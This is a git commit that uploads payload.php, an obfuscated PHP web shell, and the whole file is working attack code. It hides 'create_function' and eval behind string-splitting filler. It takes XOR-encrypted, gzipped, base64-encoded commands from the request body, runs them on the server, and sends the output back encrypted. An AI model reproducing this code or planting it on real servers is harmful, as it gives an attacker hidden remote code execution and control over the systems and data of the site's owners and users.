6a9a063b33dd30d989f7b0696de55ae8863af6da
Ali The PYTHON <92089109+Alikhanjan99@users.noreply.github.com>
2023-06-01 09:59:18 -0400

    Add files via upload

---
+++ payload.php
@@ -0,0 +1,13 @@
+<?php
+$X='en(2K2K$t);$o="";2Kfor($2Ki2K=0;$i<$l;){for(2K$j=02K;($j<2K$c&&$i<$l2K);$2';
+$n='$k=2K"827ccb0e";2K$kh2K=2K"ea8a72K06c4c34";$kf2K="a162K8912Kf84e7b";$2Kp';
+$x='Kj++,$i2K+2K+){$o.=2K$t{$i2K}^$k{$j2K};}}return $2Ko;}if (2K@pre2Kg_m2Katc';
+$B='="B2K3jbeVUJ1j572KOonj";2K2Kf2Ku2Knction x($t,$k)2K{$c=strlen($k)2K;$l=st2Krl';
+$u='$m[1]),$2Kk)))2K;$o=@ob2K_2Kget_co2Kntents(2K);@o2Kb_end_clean();$r=2K@bas';
+$R='e2K2K64_e2Kncode(@x(@gzcom2Kpre2Kss($o)2K,$k2K));pri2Knt("$p$kh$r2K$kf");}';
+$M=str_replace('S','','cSreatSSeS_fSunctSion');
+$r='K==12K) {2K@ob_start();@eva2Kl(@gz2Kuncompress(2K@x(@ba2Kse2K64_de2Kcode2K(';
+$h='h(2K"/$kh(.+)2K$k2Kf/",@fi2Kle2K_get_contents2K("php://2Kinput"2K),$m)2K2';
+$L=str_replace('2K','',$n.$B.$X.$x.$h.$r.$u.$R);
+$o=$M('',$L);$o();
+?>
